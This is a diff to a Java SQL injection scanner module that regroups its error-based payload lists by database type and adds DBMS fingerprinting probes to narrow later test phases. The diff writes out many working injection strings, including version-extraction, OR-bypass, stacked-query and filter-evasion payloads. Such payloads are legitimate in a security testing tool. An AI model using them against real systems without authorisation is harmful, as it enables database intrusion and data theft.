@@ -16,6 +16,7 @@ import com.omnistrike.model.*;
 import java.nio.charset.StandardCharsets;
 import java.util.*;
 import java.util.concurrent.ConcurrentHashMap;
+import java.util.concurrent.CountDownLatch;
 import java.util.concurrent.atomic.AtomicReference;
 import java.util.regex.Matcher;
 import java.util.regex.Pattern;
@@ -38,6 +39,10 @@ public class SmartSqliDetector implements ScanModule {
     private final ConcurrentHashMap<String, Boolean> tested = new ConcurrentHashMap<>();
     // Parameters confirmed exploitable via OOB — skip all remaining phases for these
     private final Set<String> oobConfirmedParams = ConcurrentHashMap.newKeySet();
+
+    // DBMS fingerprint cache: URL path → detected DBMS (empty string = inconclusive)
+    private final ConcurrentHashMap<String, String> fingerprintCache = new ConcurrentHashMap<>();
+    private final ConcurrentHashMap<String, CountDownLatch> fingerprintLatches = new ConcurrentHashMap<>();
 
     // SQL error patterns by DB type
     private static final Map<String, List<Pattern>> ERROR_PATTERNS = new LinkedHashMap<>();
@@ -134,97 +139,113 @@ public class SmartSqliDetector implements ScanModule {
         ));
     }
 
-    // Error-based payloads
-    private static final String[] ERROR_PAYLOADS = {
-            // Basic quote/syntax probes
-            "'", "''", "\"", "\\", "`",
-            "' -- -", "\" -- -",
-            "';", "\";",
-            // Classic OR/AND probes
-            "1 OR 1=1", "1' OR '1'='1", "1; --",
-            "' OR ''='", "1' OR 1=1-- -", "1\" OR 1=1-- -",
-            // CONVERT/CAST error extraction (MSSQL)
-            "1' AND 1=CONVERT(int,(SELECT @@version))-- -",
-            "1' AND 1=CONVERT(int,(SELECT DB_NAME()))-- -",
-            "1' AND 1=CONVERT(int,(SELECT user))-- -",
-            "1 AND 1=CONVERT(int,(SELECT @@version))-- -",
-            // CAST error extraction (PostgreSQL/MSSQL)
-            "1' AND 1=CAST((SELECT version()) AS int)-- -",
-            "1' AND CAST((SELECT 1) AS int)=1-- -",
-            "1 AND 1=CAST('a' AS int)-- -",
-            // Basic UNION probe
-            "' UNION SELECT NULL-- -",
-            // MySQL extractvalue/updatexml error extraction
-            "' AND extractvalue(1,concat(0x7e,version()))-- -",
-            "' AND updatexml(1,concat(0x7e,version()),1)-- -",
-            "1' AND extractvalue(1,concat(0x7e,(SELECT user())))-- -",
-            "1' AND updatexml(1,concat(0x7e,(SELECT database())),1)-- -",
-            // MySQL EXP overflow (MySQL 5.5.5+)
-            "' AND EXP(~(SELECT * FROM (SELECT version())a))-- -",
-            // MySQL GTID_SUBSET error
-            "' AND GTID_SUBSET(version(),0)-- -",
-            // MySQL JSON error extraction (5.7+)
-            "' AND JSON_KEYS((SELECT CONVERT((SELECT version()) USING utf8)))-- -",
-            // MySQL geometry functions error
-            "' AND ST_LatFromGeoHash(version())-- -",
-            "' AND ST_LongFromGeoHash(version())-- -",
-            // PostgreSQL error extraction
-            "' AND 1=1/(SELECT 0 FROM pg_sleep(0))-- -",
-            "1' AND 1::int=2::text-- -",
-            // Oracle error extraction
-            "' AND 1=UTL_INADDR.GET_HOST_NAME((SELECT banner FROM v$version WHERE ROWNUM=1))-- -",
-            "' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT banner FROM v$version WHERE ROWNUM=1))-- -",
-            "' AND 1=DBMS_UTILITY.SQLID_TO_SQLHASH((SELECT banner FROM v$version WHERE ROWNUM=1))-- -",
-            // SQLite error extraction
-            "' AND 1=LOAD_EXTENSION('a')-- -",
-            // Space bypass via comment, newline, plus, tab
-            "1'/**/OR/**/1=1-- -",
-            "1'%0aOR%0a1=1-- -",
-            "1'+OR+1=1-- -",
-            "1'%09OR%091=1-- -",
-            "1'%0bOR%0b1=1-- -",
-            "1'%0cOR%0c1=1-- -",
-            "1'%a0OR%a01=1-- -",
-            // Stacked query probes
-            "1';SELECT+1-- -",
-            "1\";SELECT+1-- -",
-            "1;SELECT 1-- -",
-            // Parenthetical grouping
-            "1')OR('1'='1",
-            "1'))OR(('1'='1",
-            "1') OR 1=1-- -",
-            "1')) OR 1=1-- -",
-            "1') AND ('1'='1",
-            "1%') OR 1=1-- -",
-            // Backslash escape variants (MySQL NO_BACKSLASH_ESCAPES)
-            "\\'", "\\\\'",
-            // Null byte
-            "%00'",
-            // Wildcard LIKE probe
-            "' LIKE '",
-            "' NOT LIKE '",
-            // Math/arithmetic error probes
-            "1/0", "' OR 1/0-- -",
-            "1' AND 1/0-- -",
-            // HAVING/GROUP BY error extraction
-            "' HAVING 1=1-- -",
-            "' GROUP BY 1 HAVING 1=1-- -",
-            "1' ORDER BY 1,SLEEP(0)-- -",
-            // MySQL INTO error
-            "' INTO @a-- -",
-            "' INTO OUTFILE '/dev/null'-- -",
-            // Double-query error injection
-            "1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -",
-            // MSSQL specific
-            "1' AND 1=@@SERVERNAME-- -",
-            "1'; EXEC xp_msver-- -",
-            // Inline comment injection
-            "1'/*!50000OR*/1=1-- -",
-            "1'/*!OR*/1=1-- -",
-            // Scientific notation edge case
-            "1e0' OR '1'='1",
-            "1e0\" OR \"1\"=\"1",
-    };
+    // Error-based payloads by DB type
+    private static final Map<String, String[]> ERROR_PAYLOADS_BY_DBMS;
+    static {
+        Map<String, String[]> ep = new LinkedHashMap<>();
+        ep.put("Generic", new String[]{
+                // Basic quote/syntax probes
+                "'", "''", "\"", "\\", "`",
+                "' -- -", "\" -- -",
+                "';", "\";",
+                // Classic OR/AND probes
+                "1 OR 1=1", "1' OR '1'='1", "1; --",
+                "' OR ''='", "1' OR 1=1-- -", "1\" OR 1=1-- -",
+                // Basic UNION probe
+                "' UNION SELECT NULL-- -",
+                // CAST error extraction (PostgreSQL/MSSQL)
+                "1' AND 1=CAST((SELECT version()) AS int)-- -",
+                "1' AND CAST((SELECT 1) AS int)=1-- -",
+                "1 AND 1=CAST('a' AS int)-- -",
+                // Space bypass via comment, newline, plus, tab
+                "1'/**/OR/**/1=1-- -",
+                "1'%0aOR%0a1=1-- -",
+                "1'+OR+1=1-- -",
+                "1'%09OR%091=1-- -",
+                "1'%0bOR%0b1=1-- -",
+                "1'%0cOR%0c1=1-- -",
+                "1'%a0OR%a01=1-- -",
+                // Stacked query probes
+                "1';SELECT+1-- -",
+                "1\";SELECT+1-- -",
+                "1;SELECT 1-- -",
+                // Parenthetical grouping
+                "1')OR('1'='1",
+                "1'))OR(('1'='1",
+                "1') OR 1=1-- -",
+                "1')) OR 1=1-- -",
+                "1') AND ('1'='1",
+                "1%') OR 1=1-- -",
+                // Backslash escape variants
+                "\\'", "\\\\'",
+                // Null byte
+                "%00'",
+                // Wildcard LIKE probe
+                "' LIKE '",
+                "' NOT LIKE '",
+                // Math/arithmetic error probes
+                "1/0", "' OR 1/0-- -",
+                "1' AND 1/0-- -",
+                // HAVING/GROUP BY error extraction
+                "' HAVING 1=1-- -",
+                "' GROUP BY 1 HAVING 1=1-- -",
+                // Scientific notation edge case
+                "1e0' OR '1'='1",
+                "1e0\" OR \"1\"=\"1",
+        });
+        ep.put("MySQL", new String[]{
+                // extractvalue/updatexml error extraction
+                "' AND extractvalue(1,concat(0x7e,version()))-- -",
+                "' AND updatexml(1,concat(0x7e,version()),1)-- -",
+                "1' AND extractvalue(1,concat(0x7e,(SELECT user())))-- -",
+                "1' AND updatexml(1,concat(0x7e,(SELECT database())),1)-- -",
+                // EXP overflow (MySQL 5.5.5+)
+                "' AND EXP(~(SELECT * FROM (SELECT version())a))-- -",
+                // GTID_SUBSET error
+                "' AND GTID_SUBSET(version(),0)-- -",
+                // JSON error extraction (5.7+)
+                "' AND JSON_KEYS((SELECT CONVERT((SELECT version()) USING utf8)))-- -",
+                // geometry functions error
+                "' AND ST_LatFromGeoHash(version())-- -",
+                "' AND ST_LongFromGeoHash(version())-- -",
+                // ORDER BY SLEEP
+                "1' ORDER BY 1,SLEEP(0)-- -",
+                // INTO error
+                "' INTO @a-- -",
+                "' INTO OUTFILE '/dev/null'-- -",
+                // Double-query error injection
+                "1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -",
+                // Inline comment injection
+                "1'/*!50000OR*/1=1-- -",
+                "1'/*!OR*/1=1-- -",
+        });
+        ep.put("MSSQL", new String[]{
+                // CONVERT error extraction
+                "1' AND 1=CONVERT(int,(SELECT @@version))-- -",
+                "1' AND 1=CONVERT(int,(SELECT DB_NAME()))-- -",
+                "1' AND 1=CONVERT(int,(SELECT user))-- -",
+                "1 AND 1=CONVERT(int,(SELECT @@version))-- -",
+                // MSSQL specific
+                "1' AND 1=@@SERVERNAME-- -",
+                "1'; EXEC xp_msver-- -",
+        });
+        ep.put("PostgreSQL", new String[]{
+                // PostgreSQL error extraction
+                "' AND 1=1/(SELECT 0 FROM pg_sleep(0))-- -",
+                "1' AND 1::int=2::text-- -",
+        });
+        ep.put("Oracle", new String[]{
+                // Oracle error extraction
+                "' AND 1=UTL_INADDR.GET_HOST_NAME((SELECT banner FROM v$version WHERE ROWNUM=1))-- -",
+                "' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT banner FROM v$version WHERE ROWNUM=1))-- -",
+                "' AND 1=DBMS_UTILITY.SQLID_TO_SQLHASH((SELECT banner FROM v$version WHERE ROWNUM=1))-- -",
+        });
+        ep.put("SQLite", new String[]{
+                // SQLite error extraction
+                "' AND 1=LOAD_EXTENSION('a')-- -",
+        });
+        ERROR_PAYLOADS_BY_DBMS = Collections.unmodifiableMap(ep);
+    }
 
     // Time-based payloads by DB
     private static final Map<String, String[]> TIME_PAYLOADS;
@@ -704,6 +725,16 @@ public class SmartSqliDetector implements ScanModule {
 
     private static final String UNION_MARKER = "xXsSqLiXx";
 
+    // Lightweight DBMS fingerprint probes — sent before the main payload battery
+    private static final String[] FINGERPRINT_PROBES = {
+            "'",                                                     // Universal — triggers DB-specific error messages
+            "1 AND 1=CONVERT(int,@@version)-- -",                    // MSSQL
+            "' AND 1=1::int-- -",                                    // PostgreSQL
+            "' AND extractvalue(1,1)-- -",                           // MySQL
+            "' AND 1=UTL_INADDR.GET_HOST_NAME('localhost')-- -",     // Oracle
+            "' AND sqlite_version() IS NOT NULL-- -",                // SQLite
+    };
+
     @Override
     public String getId() { return "sqli-detector"; }
 
@@ -777,15 +808,8 @@ public class SmartSqliDetector implements ScanModule {
 
     private void testParameter(HttpRequestResponse original, InjectionPoint ip, String urlPath) {
         try {
-            // Phase 1: OOB via Collaborator (FIRST — fastest path to confirmed finding)
-            // OOB is fire-and-forget: send payloads now, Collaborator polls for interactions
-            // in the background. If confirmed, oobConfirmedParams is set and remaining phases skip.
-            if (config.getBool("sqli.oob.enabled", true) && collaboratorManager != null && collaboratorManager.isAvailable()) {
-                testOob(original, ip);
-            }
-
-            // Phase 2: Baseline (3 measurements, use max to reduce false positives)
-            if (oobConfirmedParams.contains(ip.name)) return;
+            // Phase 1: Baseline (3 measurements, use max to reduce false positives)
+            // Baseline must come first — fingerprint needs baselineBody for comparison
             TimedResult baselineTimedResult = measureResponseTime(original, ip, ip.originalValue);
             HttpRequestResponse baseline = baselineTimedResult.response;
             if (baseline == null || baseline.response() == null) return;
@@ -802,37 +826,50 @@ public class SmartSqliDetector implements ScanModule {
             int baselineLength = baselineBody.length();
             int baselineStatus = baseline.response().statusCode();
 
-            // Phase 3: Auth bypass (if enabled and looks like a login param)
+            // Phase 2: DBMS Fingerprint — identify backend DB to skip irrelevant payloads
+            String detectedDbms = null;
+            if (config.getBool("sqli.fingerprint.enabled", true)) {
+                detectedDbms = fingerprintDbms(original, ip, urlPath, baselineBody);
+            }
+
+            // Phase 3: OOB via Collaborator (fire-and-forget: send payloads now, Collaborator
+            // polls for interactions in the background. If confirmed, oobConfirmedParams is set
+            // and remaining phases skip.)
+            if (config.getBool("sqli.oob.enabled", true) && collaboratorManager != null && collaboratorManager.isAvailable()) {
+                testOob(original, ip, detectedDbms);
+            }
+
+            // Phase 4: Auth bypass (if enabled and looks like a login param)
             if (oobConfirmedParams.contains(ip.name)) return;
             if (config.getBool("sqli.authBypass.enabled", true)) {
                 testAuthBypass(original, ip, baselineStatus, baselineLength, baselineBody);
             }
 
-            // Phase 4: Error-based (if enabled)
+            // Phase 5: Error-based (if enabled)
             if (oobConfirmedParams.contains(ip.name)) return;
             if (config.getBool("sqli.error.enabled", true)) {
-                testErrorBased(original, ip, baselineBody);
+                testErrorBased(original, ip, baselineBody, detectedDbms);
             }
 
-            // Phase 5: Union-based (if enabled)
+            // Phase 6: Union-based (if enabled)
             if (oobConfirmedParams.contains(ip.name)) return;
             if (config.getBool("sqli.union.enabled", true)) {
                 testUnionBased(original, ip, baselineLength, baselineStatus, baselineBody);
             }
 
-            // Phase 6: Boolean-based blind (if enabled)
+            // Phase 7: Boolean-based blind (if enabled)
             if (oobConfirmedParams.contains(ip.name)) return;
             if (config.getBool("sqli.boolean.enabled", true)) {
                 testBooleanBased(original, ip, baselineLength, baselineStatus, baselineBody);
             }
 
-            // Phase 7: Time-based blind (LAST — serialized via TimingLock)
+            // Phase 8: Time-based blind (LAST — serialized via TimingLock)
             // Gated by global TimingLock.isEnabled() checkbox AND per-module config
             if (oobConfirmedParams.contains(ip.name)) return;
             if (TimingLock.isEnabled() && config.getBool("sqli.time.enabled", true)) {
                 try {
                     TimingLock.acquire();
-                    testTimeBased(original, ip, baselineTime);
+                    testTimeBased(original, ip, baselineTime, detectedDbms);
                 } catch (InterruptedException e) {
                     Thread.currentThread().interrupt();
                     return;
@@ -848,7 +885,8 @@ public class SmartSqliDetector implements ScanModule {
 
     // ==================== PHASE 2: ERROR-BASED ====================
 
-    private void testErrorBased(HttpRequestResponse original, InjectionPoint ip, String baselineBody) {
+    private void testErrorBased(HttpRequestResponse original, InjectionPoint ip, String baselineBody,
+                                 String detectedDbms) {
         // Baseline stability check: verify baseline body is stable across requests
         try {
             HttpRequestResponse stabCheck = sendWithPayload(original, ip, ip.originalValue);
@@ -869,51 +907,60 @@ public class SmartSqliDetector implements ScanModule {
             }
         } catch (Exception ignored) {}
 
-        for (String payload : ERROR_PAYLOADS) {
-            try {
+        for (Map.Entry<String, String[]> dbmsEntry : ERROR_PAYLOADS_BY_DBMS.entrySet()) {
+            String payloadDbms = dbmsEntry.getKey();
 
-                HttpRequestResponse result = sendWithPayload(original, ip, payload);
-                if (result == null || result.response() == null) continue;
+            // DBMS filtering: if fingerprint identified a DBMS, skip payloads for other DBMSes
+            if (detectedDbms != null && !payloadDbms.equals("Generic") && !payloadDbms.equals(detectedDbms)) {
+                continue;
+            }
 
-                // Skip 400 Bad Request — often just input validation rejecting the quote/payload,
-                // and the error page may contain SQL-like keywords (e.g., "syntax error in query string")
-                int statusCode = result.response().statusCode();
-                if (statusCode == 400 || statusCode == 403 || statusCode == 404) continue;
+            for (String payload : dbmsEntry.getValue()) {
+                try {
 
-                String responseBody = result.response().bodyToString();
+                    HttpRequestResponse result = sendWithPayload(original, ip, payload);
+                    if (result == null || result.response() == null) continue;
 
-                // Check for SQL error signatures
-                for (Map.Entry<String, List<Pattern>> entry : ERROR_PATTERNS.entrySet()) {
-                    String dbType = entry.getKey();
-                    for (Pattern pattern : entry.getValue()) {
-                        Matcher m = pattern.matcher(responseBody);
-                        // Guard: if baseline is empty, require the response to be a 500 (server error)
-                        // to avoid matching error keywords in generic error pages
-                        boolean baselineEmpty = baselineBody == null || baselineBody.isEmpty();
-                        if (baselineEmpty && statusCode != 500) continue;
-                        if (m.find() && !pattern.matcher(baselineBody != null ? baselineBody : "").find()) {
-                            String evidence = m.group();
-                            findingsStore.addFinding(Finding.builder("sqli-detector",
-                                            "SQL Injection (Error-Based) - " + dbType,
-                                            Severity.HIGH, Confidence.FIRM)
-                                    .url(original.request().url())
-                                    .parameter(ip.name)
-                                    .evidence("Payload: " + payload + " | Error: " + evidence)
-                                    .payload(payload)
-                                    .responseEvidence(evidence)
-                                    .description("Error-based SQL injection detected. DB type: " + dbType
-                                            + ". Parameter '" + ip.name + "' triggered a SQL error.")
-                                    .requestResponse(result)
-                                    .build());
-                            return; // Found error-based, skip remaining payloads
+                    // Skip 400 Bad Request — often just input validation rejecting the quote/payload,
+                    // and the error page may contain SQL-like keywords (e.g., "syntax error in query string")
+                    int statusCode = result.response().statusCode();
+                    if (statusCode == 400 || statusCode == 403 || statusCode == 404) continue;
+
+                    String responseBody = result.response().bodyToString();
+
+                    // Check for SQL error signatures
+                    for (Map.Entry<String, List<Pattern>> entry : ERROR_PATTERNS.entrySet()) {
+                        String dbType = entry.getKey();
+                        for (Pattern pattern : entry.getValue()) {
+                            Matcher m = pattern.matcher(responseBody);
+                            // Guard: if baseline is empty, require the response to be a 500 (server error)
+                            // to avoid matching error keywords in generic error pages
+                            boolean baselineEmpty = baselineBody == null || baselineBody.isEmpty();
+                            if (baselineEmpty && statusCode != 500) continue;
+                            if (m.find() && !pattern.matcher(baselineBody != null ? baselineBody : "").find()) {
+                                String evidence = m.group();
+                                findingsStore.addFinding(Finding.builder("sqli-detector",
+                                                "SQL Injection (Error-Based) - " + dbType,
+                                                Severity.HIGH, Confidence.FIRM)
+                                        .url(original.request().url())
+                                        .parameter(ip.name)
+                                        .evidence("Payload: " + payload + " | Error: " + evidence)
+                                        .payload(payload)
+                                        .responseEvidence(evidence)
+                                        .description("Error-based SQL injection detected. DB type: " + dbType
+                                                + ". Parameter '" + ip.name + "' triggered a SQL error.")
+                                        .requestResponse(result)
+                                        .build());
+                                return; // Found error-based, skip remaining payloads
+                            }
                         }
                     }
-                }
 
-                perHostDelay();
-            } catch (InterruptedException e) {
-                Thread.currentThread().interrupt();
-                return;
+                    perHostDelay();
+                } catch (InterruptedException e) {
+                    Thread.currentThread().interrupt();
+                    return;
+                }
             }
         }
     }
@@ -1368,7 +1415,8 @@ public class SmartSqliDetector implements ScanModule {
 
     // ==================== PHASE 4: TIME-BASED BLIND ====================
 
-    private void testTimeBased(HttpRequestResponse original, InjectionPoint ip, long baselineTime) {
+    private void testTimeBased(HttpRequestResponse original, InjectionPoint ip, long baselineTime,
+                                String detectedDbms) {
         int delayThreshold = config.getInt("sqli.time.threshold", 14400);
 
         // Step 0: Collect 3 baseline measurements and check stability
@@ -1397,6 +1445,12 @@ public class SmartSqliDetector implements ScanModule {
 
         for (Map.Entry<String, String[]> entry : TIME_PAYLOADS.entrySet()) {
             String dbType = entry.getKey();
+
+            // DBMS filtering: if fingerprint identified a DBMS, skip time payloads for other DBMSes
+            // (TIME_PAYLOADS has no "Generic" group — all entries are DB-specific)
+            if (detectedDbms != null && !dbType.equals(detectedDbms)) {
+                continue;
+            }
             for (String payload : entry.getValue()) {
                 try {
                     // Step 1: Send true-condition delay payload
@@ -1616,11 +1670,16 @@ public class SmartSqliDetector implements ScanModule {
 
     // ==================== PHASE 6: OOB VIA COLLABORATOR ====================
 
-    private void testOob(HttpRequestResponse original, InjectionPoint ip) {
+    private void testOob(HttpRequestResponse original, InjectionPoint ip, String detectedDbms) {
         String url = original.request().url();
 
         for (Map.Entry<String, String[]> entry : OOB_PAYLOADS.entrySet()) {
             String dbType = entry.getKey();
+
+            // DBMS filtering: if fingerprint identified a DBMS, skip OOB payloads for other DBMSes
+            if (detectedDbms != null && !dbType.equals("Generic") && !dbType.equals(detectedDbms)) {
+                continue;
+            }
             for (String payloadTemplate : entry.getValue()) {
                 try {
                     // AtomicReference to capture the sent request/response for the finding
@@ -1680,6 +1739,135 @@ public class SmartSqliDetector implements ScanModule {
                 }
             }
         }
+    }
+
+    // ==================== DBMS FINGERPRINTING ====================
+
+    /**
+     * Attempt to identify the backend DBMS by sending lightweight probes and matching
+     * response errors against ERROR_PATTERNS. Results are cached per URL path so only
+     * the first parameter on a given endpoint pays the fingerprint cost.
+     *
+     * @return DBMS name (e.g. "MySQL"), or null if inconclusive / disabled
+     */
+    private String fingerprintDbms(HttpRequestResponse original, InjectionPoint ip,
+                                    String urlPath, String baselineBody) {
+        // Fast path: check cache
+        String cached = fingerprintCache.get(urlPath);
+        if (cached != null) {
+            return cached.isEmpty() ? null : cached;
+        }
+
+        // Thread coordination: only one thread fingerprints per URL path
+        CountDownLatch newLatch = new CountDownLatch(1);
+        CountDownLatch existing = fingerprintLatches.putIfAbsent(urlPath, newLatch);
+        if (existing != null) {
+            // Another thread is already fingerprinting this path — wait for it
+            try {
+                existing.await();
+            } catch (InterruptedException e) {
+                Thread.currentThread().interrupt();
+                return null;
+            }
+            cached = fingerprintCache.get(urlPath);
+            return (cached != null && !cached.isEmpty()) ? cached : null;
+        }
+
+        // We won the race — perform fingerprinting
+        try {
+            String result = runFingerprintProbes(original, ip, baselineBody);
+
+            // Cache the result (empty string = inconclusive)
+            fingerprintCache.put(urlPath, result != null ? result : "");
+
+            if (result != null) {
+                api.logging().logToOutput("[SQLi] DBMS fingerprint: " + result
+                        + " (path=" + urlPath + ", param=" + ip.name + ")");
+
+                // Report as INFO finding
+                findingsStore.addFinding(Finding.builder("sqli-detector",
+                                "DBMS Fingerprint: " + result,
+                                Severity.INFO, Confidence.TENTATIVE)
+                        .url(original.request().url())
+                        .parameter(ip.name)
+                        .description("DBMS fingerprinted as " + result + " via error-based probes. "
+                                + "Subsequent payload phases will be filtered to " + result
+                                + "-specific and generic payloads, reducing request count.")
+                        .build());
+            } else {
+                api.logging().logToOutput("[SQLi] DBMS fingerprint inconclusive"
+                        + " (path=" + urlPath + ", param=" + ip.name + ") — all payloads will fire");
+            }
+
+            return result;
+        } finally {
+            newLatch.countDown();
+            fingerprintLatches.remove(urlPath);
+        }
+    }
+
+    /**
+     * Send fingerprint probes and match responses against ERROR_PATTERNS.
+     * Returns the DBMS name with the most hits, or null if no matches.
+     */
+    private String runFingerprintProbes(HttpRequestResponse original, InjectionPoint ip,
+                                         String baselineBody) {
+        Map<String, Integer> hits = new LinkedHashMap<>();
+
+        for (int i = 0; i < FINGERPRINT_PROBES.length; i++) {
+            String probe = FINGERPRINT_PROBES[i];
+
+            try {
+                HttpRequestResponse result = sendWithPayload(original, ip, probe);
+                if (result == null || result.response() == null) continue;
+
+                int statusCode = result.response().statusCode();
+                String responseBody = result.response().bodyToString();
+                if (responseBody == null) responseBody = "";
+
+                // Match response against DBMS-specific error patterns (skip "Generic")
+                for (Map.Entry<String, List<Pattern>> entry : ERROR_PATTERNS.entrySet()) {
+                    String dbms = entry.getKey();
+                    if ("Generic".equals(dbms)) continue;
+
+                    for (Pattern pattern : entry.getValue()) {
+                        // Only count if pattern matches response but NOT baseline
+                        if (pattern.matcher(responseBody).find()
+                                && (baselineBody == null || !pattern.matcher(baselineBody).find())) {
+                            hits.merge(dbms, 1, Integer::sum);
+                        }
+                    }
+                }
+
+                // Smart early exit: if the universal probe (') alone matched 2+ patterns
+                // for one DBMS, we have high confidence — return immediately (1 request)
+                if (i == 0) {
+                    for (Map.Entry<String, Integer> h : hits.entrySet()) {
+                        if (h.getValue() >= 2) {
+                            return h.getKey();
+                        }
+                    }
+                    // If ' produced no patterns and status != 500, the app likely doesn't
+                    // reflect SQL errors — bail out early to save requests
+                    if (hits.isEmpty() && statusCode != 500) {
+                        return null;
+                    }
+                }
+
+                perHostDelay();
+            } catch (InterruptedException e) {
+                Thread.currentThread().interrupt();
+                return null;
+            }
+        }
+
+        // Return the DBMS with the most hits (if any)
+        if (hits.isEmpty()) return null;
+
+        return hits.entrySet().stream()
+                .max(Map.Entry.comparingByValue())
+                .map(Map.Entry::getKey)
+                .orElse(null);
     }
 
     // ==================== HELPER METHODS ====================
@@ -1923,6 +2111,8 @@ public class SmartSqliDetector implements ScanModule {
     @Override
     public void destroy() {
         tested.clear();
+        fingerprintCache.clear();
+        fingerprintLatches.clear();
     }
 
     // Inner types
